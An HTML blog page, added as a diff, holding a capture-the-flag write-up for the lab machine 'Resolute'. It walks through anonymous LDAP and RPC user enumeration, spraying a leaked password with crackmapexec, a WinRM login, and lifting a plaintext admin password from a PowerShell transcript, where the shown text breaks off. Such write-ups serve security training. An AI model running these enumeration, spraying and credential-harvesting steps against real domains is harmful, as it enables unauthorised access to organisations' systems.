@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Resolute - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Resolute</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1731491673467"
+                  >2024-11-13 10:54</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1731504821659"
+                  >2024-11-13 14:33</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code><span class="hljs-string">$nmap</span> <span class="hljs-string">-p-</span> <span class="hljs-string">-A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.223</span><span class="hljs-number">.63</span>
+<span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span>
+<span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>       <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span>
+<span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2024-11-13 10:07:25Z</span><span class="hljs-string">)</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">MEGABANK)</span>
+<span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span>
+<span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span>
+<span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span>
+<span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>       <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span>
+<span class="hljs-number">47001</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-number">49664</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49665</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49666</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49668</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49671</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49676</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">49677</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49684</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49742</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span>
+<span class="hljs-number">49793</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">RESOLUTE;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span>
+
+<span class="hljs-attr">Host script results:</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">3:1:1:</span> 
+<span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">6.3</span><span class="hljs-string">)</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">Resolute</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">RESOLUTE\x00</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">megabank.local</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">Forest name:</span> <span class="hljs-string">megabank.local</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">Resolute.megabank.local</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2024-11-13T02:08:18-08:00</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">guest</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span>
+<span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">required</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2024-11-13T10:08:14</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-number">2024-11-13T10:01:58</span>
+<span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">2h46m18s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">4h37m10s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">6m16s</span></code></pre></div>
+<h2 id="testing-ldap">Testing ldap</h2>
+<div><pre class="hljs"><code><span class="hljs-string">./windapsearch.py</span> <span class="hljs-string">-d</span> <span class="hljs-string">resolute.megabank.local</span> <span class="hljs-string">--dc-ip</span> <span class="hljs-number">10.129</span><span class="hljs-number">.223</span><span class="hljs-number">.63</span> <span class="hljs-string">-U</span> <span class="hljs-string">--full</span>
+[<span class="hljs-string">+</span>] <span class="hljs-literal">No</span> <span class="hljs-string">username</span> <span class="hljs-string">provided.</span> <span class="hljs-string">Will</span> <span class="hljs-string">try</span> <span class="hljs-string">anonymous</span> <span class="hljs-string">bind.</span>
+[<span class="hljs-string">+</span>] <span class="hljs-attr">Using Domain Controller at:</span> <span class="hljs-number">10.129</span><span class="hljs-number">.223</span><span class="hljs-number">.63</span>
+[<span class="hljs-string">+</span>] <span class="hljs-string">Getting</span> <span class="hljs-string">defaultNamingContext</span> <span class="hljs-string">from</span> <span class="hljs-string">Root</span> <span class="hljs-string">DSE</span>
+[<span class="hljs-string">+</span>]	<span class="hljs-attr">Found:</span> <span class="hljs-string">DC=megabank,DC=local</span>
+[<span class="hljs-string">+</span>] <span class="hljs-string">Attempting</span> <span class="hljs-string">bind</span>
+[<span class="hljs-string">+</span>]	<span class="hljs-string">...success!</span> <span class="hljs-attr">Binded as:</span> 
+[<span class="hljs-string">+</span>]	 <span class="hljs-string">None</span>
+
+[<span class="hljs-string">+</span>] <span class="hljs-string">Enumerating</span> <span class="hljs-string">all</span> <span class="hljs-string">AD</span> <span class="hljs-string">users</span>
+[<span class="hljs-string">+</span>]	<span class="hljs-attr">Found 25 users:</span> 
+
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">top</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">person</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">organizationalPerson</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">user</span>
+<span class="hljs-attr">cn:</span> <span class="hljs-string">Guest</span>
+<span class="hljs-attr">description:</span> <span class="hljs-string">Built-in</span> <span class="hljs-string">account</span> <span class="hljs-string">for</span> <span class="hljs-string">guest</span> <span class="hljs-string">access</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">computer/domain</span>
+<span class="hljs-attr">distinguishedName:</span> <span class="hljs-string">CN=Guest,CN=Users,DC=megabank,DC=local</span>
+<span class="hljs-attr">instanceType:</span> <span class="hljs-number">4</span>
+<span class="hljs-attr">whenCreated:</span> <span class="hljs-number">20190925132831.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">whenChanged:</span> <span class="hljs-number">20190925132831.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">uSNCreated:</span> <span class="hljs-number">8197</span>
+<span class="hljs-attr">memberOf:</span> <span class="hljs-string">CN=Guests,CN=Builtin,DC=megabank,DC=local</span>
+<span class="hljs-attr">uSNChanged:</span> <span class="hljs-number">8197</span>
+<span class="hljs-attr">name:</span> <span class="hljs-string">Guest</span>
+<span class="hljs-attr">objectGUID:</span> <span class="hljs-string">dVs0v8Y8kk6A6yJE8D5mmw==</span>
+<span class="hljs-attr">userAccountControl:</span> <span class="hljs-number">66082</span>
+<span class="hljs-attr">badPwdCount:</span> <span class="hljs-number">163</span>
+<span class="hljs-attr">codePage:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">countryCode:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">badPasswordTime:</span> <span class="hljs-number">133759681899721906</span>
+<span class="hljs-attr">lastLogoff:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">lastLogon:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">pwdLastSet:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">primaryGroupID:</span> <span class="hljs-number">514</span>
+<span class="hljs-attr">objectSid:</span> <span class="hljs-string">AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHW9QEAAA==</span>
+<span class="hljs-attr">accountExpires:</span> <span class="hljs-number">9223372036854775807</span>
+<span class="hljs-attr">logonCount:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">sAMAccountName:</span> <span class="hljs-string">Guest</span>
+<span class="hljs-attr">sAMAccountType:</span> <span class="hljs-number">805306368</span>
+<span class="hljs-attr">objectCategory:</span> <span class="hljs-string">CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local</span>
+<span class="hljs-attr">isCriticalSystemObject:</span> <span class="hljs-literal">TRUE</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">20190927221048.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">20190927105219.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">20190925132912.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">16010101181633.</span><span class="hljs-string">0Z</span>
+
+<span class="hljs-string">&lt;snip&gt;</span>
+
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">top</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">person</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">organizationalPerson</span>
+<span class="hljs-attr">objectClass:</span> <span class="hljs-string">user</span>
+<span class="hljs-attr">cn:</span> <span class="hljs-string">Marko</span> <span class="hljs-string">Novak</span>
+<span class="hljs-attr">sn:</span> <span class="hljs-string">Novak</span>
+<span class="hljs-attr">description:</span> <span class="hljs-string">Account</span> <span class="hljs-string">created.</span> <span class="hljs-string">Password</span> <span class="hljs-string">set</span> <span class="hljs-string">to</span> <span class="hljs-string">Welcome123!</span> <span class="hljs-string">(!!!)</span>
+<span class="hljs-attr">givenName:</span> <span class="hljs-string">Marko</span>
+<span class="hljs-attr">distinguishedName:</span> <span class="hljs-string">CN=Marko</span> <span class="hljs-string">Novak,OU=Employees,OU=MegaBank</span> <span class="hljs-string">Users,DC=megabank,DC=local</span>
+<span class="hljs-attr">instanceType:</span> <span class="hljs-number">4</span>
+<span class="hljs-attr">whenCreated:</span> <span class="hljs-number">20190927131714.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">whenChanged:</span> <span class="hljs-number">20191203132427.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">displayName:</span> <span class="hljs-string">Marko</span> <span class="hljs-string">Novak</span>
+<span class="hljs-attr">uSNCreated:</span> <span class="hljs-number">13110</span>
+<span class="hljs-attr">uSNChanged:</span> <span class="hljs-number">69792</span>
+<span class="hljs-attr">name:</span> <span class="hljs-string">Marko</span> <span class="hljs-string">Novak</span>
+<span class="hljs-attr">objectGUID:</span> <span class="hljs-string">8oIRSXQNmEW4iTLjzuwCpw==</span>
+<span class="hljs-attr">userAccountControl:</span> <span class="hljs-number">66048</span>
+<span class="hljs-attr">badPwdCount:</span> <span class="hljs-number">163</span>
+<span class="hljs-attr">codePage:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">countryCode:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">badPasswordTime:</span> <span class="hljs-number">133759681905190660</span>
+<span class="hljs-attr">lastLogoff:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">lastLogon:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">pwdLastSet:</span> <span class="hljs-number">132140638345690606</span>
+<span class="hljs-attr">primaryGroupID:</span> <span class="hljs-number">513</span>
+<span class="hljs-attr">objectSid:</span> <span class="hljs-string">AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWVwQAAA==</span>
+<span class="hljs-attr">accountExpires:</span> <span class="hljs-number">9223372036854775807</span>
+<span class="hljs-attr">logonCount:</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">sAMAccountName:</span> <span class="hljs-string">marko</span>
+<span class="hljs-attr">sAMAccountType:</span> <span class="hljs-number">805306368</span>
+<span class="hljs-attr">userPrincipalName:</span> <span class="hljs-string">marko@megabank.local</span>
+<span class="hljs-attr">objectCategory:</span> <span class="hljs-string">CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">20190927221048.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">20190927131714.</span><span class="hljs-string">0Z</span>
+<span class="hljs-attr">dSCorePropagationData:</span> <span class="hljs-number">16010101000001.</span><span class="hljs-string">0Z</span>
+
+<span class="hljs-string">&lt;snip&gt;</span></code></pre></div>
+<h2 id="testing-rpc">Testing rpc</h2>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$rpcclient</span> -U <span class="hljs-string">""</span> -N <span class="hljs-number">10.129</span>.<span class="hljs-number">223.63</span>
+rpcclient $&gt; enumdomusers
+user:<span class="hljs-selector-attr">[Administrator]</span> rid:<span class="hljs-selector-attr">[0x1f4]</span>
+user:<span class="hljs-selector-attr">[Guest]</span> rid:<span class="hljs-selector-attr">[0x1f5]</span>
+user:<span class="hljs-selector-attr">[krbtgt]</span> rid:<span class="hljs-selector-attr">[0x1f6]</span>
+user:<span class="hljs-selector-attr">[DefaultAccount]</span> rid:<span class="hljs-selector-attr">[0x1f7]</span>
+user:<span class="hljs-selector-attr">[ryan]</span> rid:<span class="hljs-selector-attr">[0x451]</span>
+user:<span class="hljs-selector-attr">[marko]</span> rid:<span class="hljs-selector-attr">[0x457]</span>
+user:<span class="hljs-selector-attr">[sunita]</span> rid:<span class="hljs-selector-attr">[0x19c9]</span>
+user:<span class="hljs-selector-attr">[abigail]</span> rid:<span class="hljs-selector-attr">[0x19ca]</span>
+user:<span class="hljs-selector-attr">[marcus]</span> rid:<span class="hljs-selector-attr">[0x19cb]</span>
+user:<span class="hljs-selector-attr">[sally]</span> rid:<span class="hljs-selector-attr">[0x19cc]</span>
+user:<span class="hljs-selector-attr">[fred]</span> rid:<span class="hljs-selector-attr">[0x19cd]</span>
+user:<span class="hljs-selector-attr">[angela]</span> rid:<span class="hljs-selector-attr">[0x19ce]</span>
+user:<span class="hljs-selector-attr">[felicia]</span> rid:<span class="hljs-selector-attr">[0x19cf]</span>
+user:<span class="hljs-selector-attr">[gustavo]</span> rid:<span class="hljs-selector-attr">[0x19d0]</span>
+user:<span class="hljs-selector-attr">[ulf]</span> rid:<span class="hljs-selector-attr">[0x19d1]</span>
+user:<span class="hljs-selector-attr">[stevie]</span> rid:<span class="hljs-selector-attr">[0x19d2]</span>
+user:<span class="hljs-selector-attr">[claire]</span> rid:<span class="hljs-selector-attr">[0x19d3]</span>
+user:<span class="hljs-selector-attr">[paulo]</span> rid:<span class="hljs-selector-attr">[0x19d4]</span>
+user:<span class="hljs-selector-attr">[steve]</span> rid:<span class="hljs-selector-attr">[0x19d5]</span>
+user:<span class="hljs-selector-attr">[annette]</span> rid:<span class="hljs-selector-attr">[0x19d6]</span>
+user:<span class="hljs-selector-attr">[annika]</span> rid:<span class="hljs-selector-attr">[0x19d7]</span>
+user:<span class="hljs-selector-attr">[per]</span> rid:<span class="hljs-selector-attr">[0x19d8]</span>
+user:<span class="hljs-selector-attr">[claude]</span> rid:<span class="hljs-selector-attr">[0x19d9]</span>
+user:<span class="hljs-selector-attr">[melanie]</span> rid:<span class="hljs-selector-attr">[0x2775]</span>
+user:<span class="hljs-selector-attr">[zach]</span> rid:<span class="hljs-selector-attr">[0x2776]</span>
+user:<span class="hljs-selector-attr">[simon]</span> rid:<span class="hljs-selector-attr">[0x2777]</span>
+user:<span class="hljs-selector-attr">[naoki]</span> rid:<span class="hljs-selector-attr">[0x2778]</span>
+rpcclient $&gt; querydominfo
+Domain:		MEGABANK
+Server:		
+Comment:	
+Total Users:	<span class="hljs-number">79</span>
+Total Groups:	<span class="hljs-number">0</span>
+Total Aliases:	<span class="hljs-number">0</span>
+Sequence No:	<span class="hljs-number">1</span>
+Force Logoff:	-<span class="hljs-number">1</span>
+Domain Server State:	<span class="hljs-number">0</span>x1
+Server Role:	ROLE_DOMAIN_PDC
+Unknown <span class="hljs-number">3</span>:	<span class="hljs-number">0</span>x1
+rpcclient $&gt; getdompwinfo
+min_password_length: <span class="hljs-number">7</span>
+password_properties: <span class="hljs-number">0</span>x00000000</code></pre></div>
+<div><pre class="hljs"><code>crackmapexec smb 10.129.223.63 -u users.txt -p Welcome123!
+SMB         10.129.223.63   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.223.63   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.223.63   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.223.63   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.223.63   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! </code></pre></div>
+<p>We can get in using <code>evil-winrm -i 10.129.223.63 -u melanie -p Welcome123!</code> and grab user flag.</p>
+<h1 id="system-exploration">System exploration</h1>
+<p>Listing all dirs in <code>C:\</code> with <code>dir -force</code> reveals PSTranscripts dir. It contains another hidden dir, <code>20191203</code>. Finally, it contains <code>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code>.</p>
+<div><pre class="hljs"><code><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Command start time: 20191203063455
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+PS&gt;TerminatingError(): "System error."
+&gt;&gt; CommandInvocation(Invoke-Expression): "Invoke-Expression"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+&gt;&gt; CommandInvocation(Out-String): "Out-String"
+&gt;&gt; ParameterBinding(Out-String): name="Stream"; value="True"
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Command start time: 20191203063455
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+PS&gt;ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents&gt; "
+PS megabank\ryan@RESOLUTE Documents&gt;
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Command start time: 20191203063515
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+PS&gt;CommandInvocation(Invoke-Expression): "Invoke-Expression"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+&gt;&gt; CommandInvocation(Out-String): "Out-String"
+&gt;&gt; ParameterBinding(Out-String): name="Stream"; value="True"
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Command start time: 20191203063515
+<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**
+PS&gt;CommandInvocation(Out-String): "Out-String"
+&gt;&gt; ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123! (!!!)
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
